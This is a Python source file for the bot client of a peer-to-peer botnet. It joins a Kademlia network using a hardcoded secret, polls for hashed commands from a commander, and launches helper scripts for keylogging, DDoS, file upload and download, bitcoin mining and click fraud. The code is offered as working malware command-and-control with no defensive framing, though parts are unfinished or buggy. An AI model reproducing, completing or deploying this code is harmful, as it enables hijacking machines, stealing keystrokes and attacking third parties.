import logging, sys, pdb
import pprint as pp
import asyncio, subprocess, hashlib, socket
#from asyncio.tasks import ensure_future
from kademlia.network import Server
from collections import Counter
#from .globals import SECRET # Trying to import var from global file
#Network Secret, allows nodes to join same Network
SECRET="TheSecretKey"

#Setup logging
handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
log = logging.getLogger('kademlia')
log.addHandler(handler)
#log.setLevel(logging.DEBUG) #DEBUG


if len(sys.argv) != 4:
    print("Usage: python botnet.py <bootstrap ip> <bootstrap port> <bot port>")
    exit(0)

#Helper functions
def get_ip_address():
    #NOTE: This would be LAN IP and not WAN IP, can adjust code to reflect change if needed
    ## Attempts to Connects to WAN and gets ip address of socket that connected
    ##TODO: Allow bot to communicte with V6 or V4 Addresses
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("1.1.1.1", 80))
    return s.getsockname()[0]

def get_hash(prehash):
    m = hashlib.sha1()
    m.update(prehash.encode('utf-8'))
    return m.hexdigest()

def most_common(list):
    data = Counter(list)
    return data.most_common(1)[0][0]

#Bot class that holds network, and bot information 
class botnode:
    def __init__(self, ip, port, network_id, cmdhash):
        self._ip = ip
        self._port = port
        self._id = network_id
        self._cmdcnt = 0
        #self._cmdque = asyncio.Queue() #TODO use for querying multiple commands at once.
        # this will store all the child processes that are started
        self._pgroup = []
        #This should be populated from a seperate file then encrytped
        self._cmdsrun = {'DDOS': False, 'SHELL': False, 'DOWNLOAD': False,
                        'KEYLOG': False, 'UPLOAD': False, 'BITCOIN': False,
                        'CLICKFRAUD': False, 'HELLO': False}
        # This is the hash of this node's bot ID (Will be used when commander looks up machines to send CMDs)
        self._cmdkey = cmdhash
    def listVars(self):
        pp.pprint(vars(self))
"""
Query Value returned from _cmdkey
If command has not been ran then spawn a child process, and run the command.
Block the command from being run again.
Return to wait_cmd() loop and check for new commands
"""
async def get_cmd(value, sever, bot):
    #The bot needs to check the recived command ID (hashed) from the commander, then sets its value to true and performs the works
    hashcmds = [get_hash(command) for command in bot._cmdsrun.keys()] #Create a list of the hash IDs for commands (ie. SHA1 digest of 'HELLO')
    #print("\nTrying to find {} in {}\n".format(value,hashcmds)) #Debug print statement
    """ Ideally the commands should not be stored but pulled from another source
    def run_cmd(cmd):
        decrypt(cmd)
        if bot._cmdsrun[cmd] is False:
            
            tmp = 'python {} {}'.format(cmd)
    """
    try:
        
        args = value.split()
        cnt = len(args) # parse out the command count
        #cnt=len(args)
        cmd = args[0]
        print("\nRUNNING CMD: {}\nCMD CNT: {}\nTotal CMDS:{}".format(cmd,cnt,bot._cmdcnt))
        cmd_path=sys.path.insert(0,"./load/")
        # This eventually will automatically populate the commands to check 
        # Checks if the recieved hash from the commander matches one of the valid commands stored in bot. (see self._cmdsrun)
        # If that has matches, well mark command true to prevent running same command repeatedly. Start a child process, and run the command. 
        if cmd in hashcmds and cnt > bot._cmdcnt:
            bot._cmdcnt += 1
            #run_cmd(cmd)
            if cmd == get_hash('KEYLOG'):
                if bot._cmdsrun['KEYLOG'] is False:
                    tmp = 'python keylogger.py {0}'.format(bot._cmdkey)
                    print("Starting keylogger")
                    process = subprocess.Popen(tmp.split(), shell=False)
                    bot._pgroup.append(process)
                    bot._cmdsrun['KEYLOG'] = True
            if cmd == get_hash('DDOS'):
                if bot._cmdsrun['DDOS'] is False:
                    tmp = 'python ddos.py {0}'.format(' '.join(args[1:]))
                    print("Starting DDOS on {0}".format(tmp))
                    process = subprocess.Popen(tmp.split(), shell=False)
                    bot._cmdsrun['DDOS'] = True
            if cmd == get_hash('UPLOAD'):
                tmp = 'python upload.py {0}'.format(' '.join(args[1:]))
                print("Starting upload on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)
            if cmd == get_hash('DOWNLOAD'):
                tmp = 'python download.py {0}'.format(' '.join(args[1:]))
                print("Starting DOWNLOAD on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)
            if cmd == get_hash('BITCOIN'):
                tmp = 'python mine.py {0}'.format(' '.join(args[1:]))
                print("Starting BITCOING MINING on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)
            if cmd == get_hash('CLICKFRAUD'):
                tmp = 'python clickFraud.py {0}'.format(' '.join(args[1:]))
                print("Starting CLICKFRAUD on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)
            if cmd == get_hash('HELLO'):
                tmp = 'python {cmd_path}sayHello.py {0}'.format(' '.join(args[1:]))
                print("Starting Hello program on {0}".format(tmp))#log.info(msg)
                process = subprocess.Popen(tmp.split(),shell=False)
    except Exception as e:
        #log.error()
        print("\nCaught Exception {}".format(e)) #log.error(msg)
        print("We errored out trying to match command {} {}\n".format(type(cmd),cmd)) #log.error()
        pass
    # pdb.set_trace()
    # After running command set 
    #await server.set(bot._cmdkey)
    # await wait_cmd(server, bot)

"""
Query the network for any store requests with the _cmdkey of our node
While there is no command, wait 5 seconds, then check again
If command is found, break out, then run get_cmd()
"""
async def wait_cmd(server, bot):
    print("Checking for command")
    numcalls = 0
    checkCommands = await server.get(bot._cmdkey)
    while checkCommands is None: #and numcalls < 5: #set max calls to 5 for debugging 
        print("\nNO COMMAND FOR ME WAITING")
        await asyncio.sleep(5)
        checkCommands = await server.get(bot._cmdkey)
        numcalls+=1
        #When the command is received get will return True and break out of the loop
        if checkCommands or numcalls > 5: #
            print("Timed out waiting for command") 
            break
    if checkCommands is not None: # You need the if statement hear, in the case in which the command times out, the code will not try to execute a non valid command.
        print("\nFound a command\nCommand Hashed: {}\n".format(checkCommands))
        await asyncio.sleep(5)
        await get_cmd(checkCommands,server,bot)
            
    
"""
callhome -> Checks to see if a node has already joined the network
If node is not apart of network then join [set()] with the Network Key and ID value of bot
otherwise wait for commands: wait_cmd()
"""
#TODO: Fix the loop that call home creates, calling recusivly either callhome() or wait_cmd() until program runs out of memory
async def callhome(server, bot):
    ##NOTE KEY initialized at start of loop, no need to create here
    # announce to Shepard that we exist, then check for ack
    nodeId = await server.get(NETKEY)
    if nodeId != str(bot._id) or nodeId is None:
        print("No ack for {}".format(nodeId))
        await server.set(NETKEY, str(bot._id))
        await asyncio.sleep(5)
        await callhome(server,bot)
    else:    
        print("\nWe have an ack\nNode: {}\nJoined: {}\n"
        .format(nodeId,NETKEY))
        #await wait_cmd(server,bot)


##TODO:DONE - Confirm if idhash == network key, confirm from debug traces looks like NodeID might be getting set as KEY on network. 
"""
Initialize IP
CMDhash = Lookup ID for commands on network
Bot class (Ip address of node, port to communicate on, node_id, and CMDhash)
Next its going to callhome()
"""
async def setup(server):
    myip = get_ip_address()
    # the UUID for bot to check if commands are ready, is a hash of the node_id. 
    cmdhash = get_hash(str(server.node.long_id))
    #Create botnode with Its IP, Port, Bot ID, and command hash
    bot = botnode(myip, myport, str(server.node.long_id), cmdhash)

    print("\nParams: NETWORK_KEY: {}\nIP: {}\nNODE_ID: {}\nCOMMAND KEY: {}"
        .format(NETKEY, myip, server.node.long_id, cmdhash))
    #print("\nBOT CREATED?: CHECK THESE VARS:\n{}\n\n".format(vars(bot)))
    #pdb.set_trace()
    await callhome(server, bot)
    # Once callhome returns successfully then the populated bot class will be returned. Allows driving event loop to keep track of information on the bot
    return bot


### IF check does nothing server returning NoneType, bc Node has not yet joined network. 
async def bootstrapDone(server):
    result = await server.get(NETKEY) #keyhash - Might need to pass in keyhash instead. 
    if result is None:
        loop.run_until_complete(server.bootstrap([(bootstrap_ip, bootstrap_port)]))
        server.stop()
        loop.close()
        print("\nKey is: ",result, "\nBootstrapper down: machine has not joined network\n")
    print("\nAble to fetch key as result:",result, type(result))
    return result
    

#SERVER ACTUALLY STARTS HERE
bootstrap_ip = str(sys.argv[1])
bootstrap_port = int(sys.argv[2])
myport = int(sys.argv[3])

#### KEY TO JOIN NETWORK ####
NETKEY = get_hash(SECRET)

#Init Asyncio event loop
loop = asyncio.get_event_loop()
loop.set_debug(True)  

server = Server()
loop.run_until_complete(server.listen(myport))
loop.run_until_complete(server.bootstrap([(bootstrap_ip, bootstrap_port)]))
"""
    Join network  
    while bot isBootstrappted():
        check for new commands
"""
try:
    bot = loop.run_until_complete(setup(server)) #This returns bool, or nonetype
    while asyncio.ensure_future(bootstrapDone(server)): #Returns true if server is bootstrapped, otherwise will continue to try and join SECRET network.
        loop.run_until_complete(wait_cmd(server, bot)) #If we on the network wait for a command;
        asyncio.sleep(1)
    loop.run_forever()
except KeyboardInterrupt:
    pass
finally:
    server.stop()
    loop.close()
    
#pdb.set_trace()
#asyncio.ensure_future(bootstrapDone(server)) ## Getting some errors here, need to troubleshoot, but this is just a check to see if we on network. Callhome kinda does similar thing so might not be needed
